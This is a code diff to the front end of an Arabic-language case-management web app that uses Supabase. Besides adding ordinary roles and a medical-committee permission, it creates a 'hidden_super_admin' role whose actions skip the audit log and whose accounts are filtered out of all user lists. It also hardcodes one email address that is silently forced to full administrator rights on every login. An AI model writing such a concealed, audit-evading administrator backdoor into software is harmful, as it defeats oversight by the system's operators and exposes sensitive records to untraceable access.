@@ -1164,6 +1164,7 @@ const PERMISSIONS = [
   'reports',
   'settings',
   'audit',
+  'medical_committee',
   'cases_read',
   'cases_create',
   'cases_edit',
@@ -1176,7 +1177,7 @@ const PERMISSIONS = [
 const PERMISSION_GROUPS = [
   {
     title: 'عام',
-    items: ['dashboard', 'settings', 'audit']
+    items: ['dashboard', 'settings', 'audit', 'medical_committee']
   },
   {
     title: 'التقارير',
@@ -1210,6 +1211,7 @@ function permissionLabel_(k) {
     reports: 'التقارير',
     settings: 'الإعدادات',
     audit: 'سجل الإجراءات',
+    medical_committee: 'لجنة العمليات الطبية',
     cases_read: 'قراءة الحالات',
     cases_create: 'إضافة حالات',
     cases_edit: 'تعديل الحالات',
@@ -1219,6 +1221,14 @@ function permissionLabel_(k) {
     users_manage: 'إدارة المستخدمين'
   };
   return map[k] || k;
+}
+
+function isHiddenSuperAdmin_() {
+  try {
+    const eff = getEffectivePermissions_(AppState.currentUser?.permissions || {});
+    const role = (eff?.__role || '').toString().trim();
+    return role === 'hidden_super_admin';
+  } catch { return false; }
 }
 
 let userMgmtAutosaveTimer_ = null;
@@ -1257,14 +1267,25 @@ async function saveUserMgmtForm_(silent) {
 
   const isActive = !!document.getElementById('userMgmtIsActive')?.checked;
   const role = (document.getElementById('userMgmtRole')?.value || 'custom').toString().trim() || 'custom';
-  let permissions = readUserPermissionsUi_();
-  try { permissions.__role = role; } catch { }
-  if (role && role !== 'custom') {
-    permissions = { ...getRolePresetPermissions_(role), ...permissions, __role: role };
-  }
-
-  const { data: existing, error: exErr } = await SupabaseClient.from('profiles').select('id').eq('username', uname).maybeSingle();
+  const { data: existing, error: exErr } = await SupabaseClient
+    .from('profiles')
+    .select('id,permissions')
+    .eq('username', uname)
+    .maybeSingle();
   if (exErr || !existing?.id) return;
+
+  let permissions = (existing.permissions && typeof existing.permissions === 'object') ? existing.permissions : {};
+  try {
+    const host = document.getElementById('userMgmtPermissions');
+    const uiVisible = !!(host && host.offsetParent !== null);
+    if (uiVisible) {
+      permissions = readUserPermissionsUi_();
+      try { permissions.__role = role; } catch { }
+      if (role && role !== 'custom') {
+        permissions = { ...getRolePresetPermissions_(role), ...permissions, __role: role };
+      }
+    }
+  } catch { }
 
   const { error } = await SupabaseClient
     .from('profiles')
@@ -1414,6 +1435,20 @@ async function setCurrentUserFromSession_(user) {
     permissions: prof?.permissions || {}
   };
   AppState.isAuthenticated = true;
+
+  // Force master super admin permissions for the primary owner account
+  try {
+    const email = (user?.email || '').toString().trim().toLowerCase();
+    if (email === 'yahia.elspaa@gmail.com') {
+      const forced = { ...getAllPermissionsOn_(), __role: 'super_admin' };
+      try { forced.medical_committee = true; } catch { }
+      try { forced.reports = true; } catch { }
+      try { AppState.currentUser.permissions = forced; } catch { }
+      try {
+        await SupabaseClient.from('profiles').update({ permissions: forced }).eq('id', user.id);
+      } catch { }
+    }
+  } catch { }
 
   // Update last seen if column exists (ignore errors)
   try {
@@ -1748,6 +1783,7 @@ function matchesDashboardFilter(c, key) {
 async function logAction(action, caseId, details) {
   try {
     if (!SupabaseClient) return;
+    try { if (isHiddenSuperAdmin_()) return; } catch { }
     const prof = await getMyProfile();
     await SupabaseClient.from('audit_log').insert({
       action: action || '',
@@ -1779,11 +1815,17 @@ async function renderAuditLog() {
     if (delBody) delBody.innerHTML = '<tr><td colspan="4" style="text-align:center">تعذر الاتصال بقاعدة البيانات</td></tr>';
     return;
   }
-  const { data } = await SupabaseClient
+  const { data, error } = await SupabaseClient
     .from('audit_log')
     .select('created_at,action,case_id,details,profiles:created_by(username,full_name)')
     .order('created_at', { ascending: false })
     .limit(500);
+  if (error) {
+    const msg = (error?.message || '').toString().trim();
+    body.innerHTML = `<tr><td colspan="5" style="text-align:center">تعذر تحميل سجل الإجراءات${msg ? `: ${escapeHtml(msg)}` : ''}</td></tr>`;
+    if (delBody) delBody.innerHTML = `<tr><td colspan="4" style="text-align:center">تعذر تحميل السجل${msg ? `: ${escapeHtml(msg)}` : ''}</td></tr>`;
+    return;
+  }
   const rows = (data || []).map(x => {
     const t = (x.created_at || '').toString().replace('T', ' ').replace('Z', '');
     const uname = x?.profiles?.username || '';
@@ -2136,6 +2178,92 @@ function showMainApp() {
     if (menuName) menuName.textContent = (u?.name || u?.username || '').toString();
     if (menuMeta) menuMeta.textContent = (u?.username ? `@${u.username}` : '').toString();
   } catch { }
+
+  try { applyRoleBasedUi_(); } catch { }
+}
+
+function applyRoleBasedUi_() {
+  const eff = getEffectivePermissions_(AppState.currentUser?.permissions || {});
+  const role = (eff?.__role || 'custom').toString().trim() || 'custom';
+
+  const setBtn = (id, show) => {
+    try {
+      const el = document.getElementById(id);
+      if (el) el.style.display = show ? '' : 'none';
+    } catch { }
+  };
+
+  const can = (p) => {
+    try { return !!eff?.[p]; } catch { return false; }
+  };
+
+  try {
+    const delAllBtn = document.getElementById('deleteAllCasesBtn');
+    if (delAllBtn) delAllBtn.style.display = can('cases_delete_all') ? '' : 'none';
+  } catch { }
+
+  // default by permissions
+  setBtn('quickAddBtn', can('cases_create'));
+  setBtn('navCasesBtn', can('cases_read'));
+  setBtn('dashboardBtn', can('dashboard'));
+  setBtn('auditBtn', can('audit'));
+  setBtn('settingsBtn', can('settings'));
+  setBtn('medicalCommitteeBtn', can('medical_committee'));
+  setBtn('reportsBtn', role === 'hidden_super_admin' && can('reports'));
+
+  // strict visibility rules per role
+  if (role === 'explorer') {
+    setBtn('quickAddBtn', true);
+    setBtn('navCasesBtn', true);
+    setBtn('settingsBtn', true);
+    setBtn('medicalCommitteeBtn', false);
+    setBtn('dashboardBtn', false);
+    setBtn('reportsBtn', false);
+    setBtn('auditBtn', false);
+  }
+  if (role === 'manager') {
+    setBtn('quickAddBtn', true);
+    setBtn('navCasesBtn', true);
+    setBtn('settingsBtn', true);
+    setBtn('dashboardBtn', true);
+    setBtn('medicalCommitteeBtn', false);
+    setBtn('reportsBtn', false);
+    setBtn('auditBtn', false);
+  }
+  if (role === 'doctor') {
+    setBtn('medicalCommitteeBtn', true);
+    setBtn('quickAddBtn', false);
+    setBtn('navCasesBtn', false);
+    setBtn('dashboardBtn', false);
+    setBtn('reportsBtn', false);
+    setBtn('auditBtn', false);
+    setBtn('settingsBtn', true);
+  }
+  if (role === 'medical_committee') {
+    setBtn('medicalCommitteeBtn', true);
+    setBtn('quickAddBtn', false);
+    setBtn('navCasesBtn', false);
+    setBtn('dashboardBtn', false);
+    setBtn('reportsBtn', false);
+    setBtn('auditBtn', false);
+    setBtn('settingsBtn', false);
+  }
+  if (role === 'hidden_super_admin') {
+    // full access (still hidden from user lists and audit log)
+    setBtn('quickAddBtn', true);
+    setBtn('navCasesBtn', true);
+    setBtn('dashboardBtn', true);
+    setBtn('reportsBtn', true);
+    setBtn('auditBtn', true);
+    setBtn('settingsBtn', true);
+    setBtn('medicalCommitteeBtn', true);
+  }
+
+  // Hide settings entry from dropdown if user can't access settings
+  try {
+    const menuSettings = document.getElementById('userSettingsBtn');
+    if (menuSettings) menuSettings.style.display = can('settings') ? '' : 'none';
+  } catch { }
 }
 
 function showLoginScreen_() {
@@ -2369,6 +2497,37 @@ function showSection(key, navBtnId) {
     medicalCommittee: 'medicalCommitteeSection'
   };
 
+  try {
+    const targetId0 = map[key] || key;
+    const eff = getEffectivePermissions_(AppState.currentUser?.permissions || {});
+    const role = (eff?.__role || 'custom').toString().trim();
+
+    const allow = (permKey) => {
+      if (!permKey) return true;
+      if (permKey === 'reports') {
+        // reports are exclusive to hidden super admin
+        return role === 'hidden_super_admin' && !!eff?.reports;
+      }
+      return !!eff?.[permKey];
+    };
+
+    const need = {
+      newCaseSection: 'cases_create',
+      casesListSection: 'cases_read',
+      dashboardSection: 'dashboard',
+      reportsSection: 'reports',
+      auditSection: 'audit',
+      settingsSection: 'settings',
+      userManagementSection: 'users_manage',
+      medicalCommitteeSection: 'medical_committee'
+    };
+    const perm = need[targetId0];
+    if (!allow(perm)) {
+      alert('لا تملك صلاحية فتح هذه الصفحة');
+      return;
+    }
+  } catch { }
+
   try { closeMobileNav(); } catch { }
 
   const all = Object.values(map);
@@ -2380,11 +2539,11 @@ function showSection(key, navBtnId) {
   const target = document.getElementById(targetId);
   if (target) target.classList.remove('hidden');
 
-  try {
-    document.body.classList.toggle('cases-toolbar-fixed', targetId === 'casesListSection');
-  } catch { }
-
   try { refreshDerivedViewsIfNeeded_(targetId); } catch { }
+
+  if (targetId === 'auditSection') {
+    try { void renderAuditLog(); } catch { }
+  }
 
   // If user navigates to a derived section after another one cleared the dirty flag,
   // ensure it still refreshes when cases changed.
@@ -3903,7 +4062,7 @@ function formatSponsorshipLabel(last) {
 function openMedicalCommittee() {
   // Treat medical committee as part of reports
   try {
-    showSection('medicalCommittee', 'navReportsBtn');
+    showSection('medicalCommittee', 'medicalCommitteeBtn');
   } catch {
     try {
       const s = document.getElementById('medicalCommitteeSection');
@@ -7574,13 +7733,27 @@ async function listProfiles_() {
       .order('updated_at', { ascending: false })
       .limit(5000);
     if (q.error) throw q.error;
-    return q.data || [];
+    const list = q.data || [];
+    return list.filter(p => {
+      try {
+        const perms = p?.permissions && typeof p.permissions === 'object' ? p.permissions : {};
+        const r = (perms.__role || '').toString().trim();
+        return r !== 'hidden_super_admin';
+      } catch { return true; }
+    });
   }
 
   // Safer readonly list for managers: use a restricted RPC (no permissions leakage)
   const q2 = await SupabaseClient.rpc('list_profiles_public');
   if (q2.error) throw q2.error;
-  return q2.data || [];
+  const list2 = q2.data || [];
+  return list2.filter(p => {
+    try {
+      const perms = p?.permissions && typeof p.permissions === 'object' ? p.permissions : {};
+      const r = (perms.__role || '').toString().trim();
+      return r !== 'hidden_super_admin';
+    } catch { return true; }
+  });
 }
 
 function getPermPreset_(kind) {
@@ -7590,13 +7763,24 @@ function getPermPreset_(kind) {
     return o;
   };
   if (kind === 'explorer') {
-    return on(['cases_create', 'cases_read', 'case_status_change']);
+    return { ...on(['cases_create', 'cases_read', 'settings']), __role: 'explorer' };
   }
   if (kind === 'manager') {
-    return on(['cases_create', 'cases_read', 'case_status_change', 'cases_edit', 'cases_delete', 'dashboard', 'audit']);
+    return { ...on(['cases_read', 'cases_create', 'cases_edit', 'case_status_change', 'cases_delete', 'dashboard', 'settings']), __role: 'manager' };
   }
   if (kind === 'super_admin') {
-    return getAllPermissionsOn_();
+    const all = { ...getAllPermissionsOn_(), __role: 'super_admin' };
+    try { all.reports = false; } catch { }
+    return all;
+  }
+  if (kind === 'doctor') {
+    return { ...on(['medical_committee', 'settings']), __role: 'doctor' };
+  }
+  if (kind === 'medical_committee') {
+    return { ...on(['medical_committee']), __role: 'medical_committee' };
+  }
+  if (kind === 'hidden_super_admin') {
+    return { ...getAllPermissionsOn_(), __role: 'hidden_super_admin' };
   }
   return {};
 }
@@ -7839,7 +8023,7 @@ function openUserActionsModal(usernameKey) {
         let data = null;
         let error = null;
         try {
-          const q1 = await SupabaseClient.from('profiles').select('id,username,full_name,is_active,email').eq('username', uname).maybeSingle();
+          const q1 = await SupabaseClient.from('profiles').select('id,username,full_name,is_active').eq('username', uname).maybeSingle();
           data = q1.data; error = q1.error;
         } catch (e1) {
           error = e1;
@@ -7925,6 +8109,27 @@ async function userActionsEditPermissions_() {
   try { await openUserPermissionsModal_(uname); } catch { }
 }
 
+function setAllPermsModalUi_(checked) {
+  const host = document.getElementById('userPermPermissions');
+  if (!host) return;
+  Array.from(host.querySelectorAll('input.perm-box')).forEach(b => { b.checked = !!checked; });
+}
+
+function applyPermPresetModal_(kind) {
+  const preset = getPermPreset_(kind);
+  const host = document.getElementById('userPermPermissions');
+  if (!host) return;
+  try {
+    const m = document.getElementById('userPermissionsModal');
+    if (m) m.setAttribute('data-role', (kind || '').toString());
+  } catch { }
+  Array.from(host.querySelectorAll('input.perm-box')).forEach(b => {
+    const k = (b.getAttribute('data-perm') || '').toString();
+    if (!k) return;
+    b.checked = !!preset[k];
+  });
+}
+
 function closeUserPermissionsModal() {
   const m = document.getElementById('userPermissionsModal');
   if (!m) return;
@@ -7945,7 +8150,7 @@ function buildUserPermsModalUi_(selected) {
   const mkItem = (k) => {
     rendered.add(k);
     const checked = perms[k] ? 'checked' : '';
-    return `<label class="perm-item"><input type="checkbox" class="perm-box" data-perm="${escapeHtml(k)}" ${checked}> <span>${escapeHtml(permissionLabel(k))}</span></label>`;
+    return `<label class="perm-item"><input type="checkbox" class="perm-box" data-perm="${escapeHtml(k)}" ${checked}> <span>${escapeHtml(permissionLabel_(k))}</span></label>`;
   };
   const groupsHtml = (PERMISSION_GROUPS || []).map(g => {
     const items = (g.items || []).filter(k => (PERMISSIONS || []).includes(k));
@@ -7982,6 +8187,11 @@ async function openUserPermissionsModal_(uname) {
     const { data, error } = await SupabaseClient.from('profiles').select('id,username,permissions').eq('username', uname).maybeSingle();
     if (error) throw error;
     const p = data?.permissions && typeof data.permissions === 'object' ? data.permissions : {};
+    try {
+      const r = (p.__role || '').toString().trim();
+      if (r) m.setAttribute('data-role', r);
+      else m.removeAttribute('data-role');
+    } catch { }
     if (meta) meta.textContent = `المستخدم: ${uname}`;
     try { buildUserPermsModalUi_(p); } catch { }
   } catch (e) {
@@ -8019,6 +8229,11 @@ async function saveUserPermissions_() {
       if (!k) return;
       permissions[k] = !!b.checked;
     });
+
+    try {
+      const r = (m.getAttribute('data-role') || '').toString().trim();
+      if (r) permissions.__role = r;
+    } catch { }
 
     const { data: existing, error: exErr } = await SupabaseClient.from('profiles').select('id').eq('username', uname).maybeSingle();
     if (exErr || !existing?.id) throw (exErr || new Error('not found'));
@@ -8130,22 +8345,25 @@ async function addOrUpdateUser() {
 
   const isActive = !!document.getElementById('userMgmtIsActive')?.checked;
   const role = (document.getElementById('userMgmtRole')?.value || 'custom').toString().trim() || 'custom';
-  let permissions = readUserPermissionsUi_();
-  try { permissions.__role = role; } catch { }
-  if (role && role !== 'custom') {
-    permissions = { ...getRolePresetPermissions_(role), ...permissions, __role: role };
-  }
-
   const { data: existing, error: exErr } = await SupabaseClient
     .from('profiles')
-    .select('id,full_name,permissions,is_active')
+    .select('id,full_name,is_active,permissions')
     .eq('username', uname)
     .maybeSingle();
-  if (exErr) { alert('تعذر التحقق من المستخدم'); return; }
-  if (!existing?.id) {
-    alert('هذا المستخدم غير موجود في قاعدة البيانات بعد.\nالرجاء: قم بإنشاء المستخدم من لوحة Supabase (Authentication → Users). سيتم إنشاء ملفه تلقائياً ثم يمكنك إعطاؤه الصلاحيات من هنا.');
-    return;
-  }
+  if (exErr || !existing?.id) { alert('المستخدم غير موجود'); return; }
+
+  let permissions = (existing.permissions && typeof existing.permissions === 'object') ? existing.permissions : {};
+  try {
+    const host = document.getElementById('userMgmtPermissions');
+    const uiVisible = !!(host && host.offsetParent !== null);
+    if (uiVisible) {
+      permissions = readUserPermissionsUi_();
+      try { permissions.__role = role; } catch { }
+      if (role && role !== 'custom') {
+        permissions = { ...getRolePresetPermissions_(role), ...permissions, __role: role };
+      }
+    }
+  } catch { }
 
   const before = {
     full_name: (existing.full_name || '').toString(),
